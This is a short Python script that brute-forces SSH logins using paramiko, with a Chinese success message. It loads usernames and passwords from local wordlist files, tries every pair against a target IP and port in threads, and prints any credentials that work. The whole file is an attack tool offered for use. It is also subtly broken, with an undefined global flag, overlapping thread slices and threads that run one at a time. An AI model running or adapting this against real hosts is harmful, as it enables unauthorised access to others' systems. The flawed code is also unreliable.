#! -*- coding:utf-8 -*-
import socket
import threading
import paramiko


def test(username,password,ip,port):
    global flag
    global ftp
    for user in username:
        for passwd in password:
            if flag==True:
                return
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                t = paramiko.Transport(ip, port)
                t.connect(username=user, password=passwd)
                flag=True
                print('\n[+] 破解成功，用户名：%s 密码：%s\n' % (user, passwd))
                return
            except:
                pass


def ssh_brute(num,ip,port):
    with open(r'C:\Users\dkl\Desktop\plan.txt', 'r') as f:
        temp = f.readlines()
    username = [str.rstrip() for str in temp]

    with open(r'C:\Users\dkl\Desktop\1.txt', 'r') as f:
        temp = f.readlines()
    password = [str.rstrip() for str in temp]
    thread_num = 4
    flag = False
    times = int(len(username) / thread_num)
    for i in range(thread_num):
        t1 = threading.Thread(target=test, args=(username[i:(i + 1) * times], password,ip,port))
        t1.start()
        t1.join()








